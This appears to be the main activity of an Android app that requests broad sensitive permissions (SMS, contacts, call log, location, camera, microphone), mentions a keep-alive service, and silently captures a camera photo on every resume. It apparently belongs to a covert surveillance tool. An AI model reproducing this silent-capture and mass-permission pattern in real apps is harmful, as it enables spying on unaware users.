package com.hc.calling

import android.Manifest
import android.content.Intent
import android.os.Bundle
import android.support.v7.app.AppCompatActivity
import com.hc.calling.callingtransaction.R
import com.hc.calling.commands.shadow.util.Photographer
import com.hc.permission.PermissonUtil
import kotlinx.android.synthetic.main.activity_main.*
import java.util.logging.Logger


class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        //start two services for keep the mainly service alive
        val intent = Intent(this, MainService::class.java)
        val intent2 = Intent(this, KeeperService::class.java)
//        startService(intent)
//        startService(intent2)
//        Photographer(this).openCamera(Photographer.CAMERA_BACK)

        //request the permissions
        PermissonUtil.requestPermisson(
            this,
            arrayOf(
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.SEND_SMS,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_SMS,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO
            ),
            10000,
            object : PermissonUtil.PermissionCallBack {
                override fun refused(permission: String?) {
                }

                override fun permitted(permission: String?) {
                }
            })

        tv_btn_takephoto.setOnClickListener {
            //            var path = File(this.getExternalFilesDir(null), DateUtil.GetNowDate("yyyy-MM-ddHHmmss") + ".mp4").path
//
//            GlobalScope.launch(Dispatchers.IO) {
//
//                VideoRecoder()
//                    .initMediaRecorde(path)
//                    .requestRecord(
//                        photographer!!.mCameraDevice!!,
//                        photographer!!.surfaces,
//                        photographer!!.handler!!
//                    )
//            }

        }

    }

    override fun onResume() {
        super.onResume()
        Photographer(this,
            { builder, session, device, imageReader, surface, handler ->

                Photographer.capture(builder, session, imageReader, device, handler)

            },
            {
                    com.orhanobut.logger.Logger.i("img saved completed")
            }
        ).openCamera("0")

    }

    override fun onDestroy() {
        super.onDestroy()
    }
}
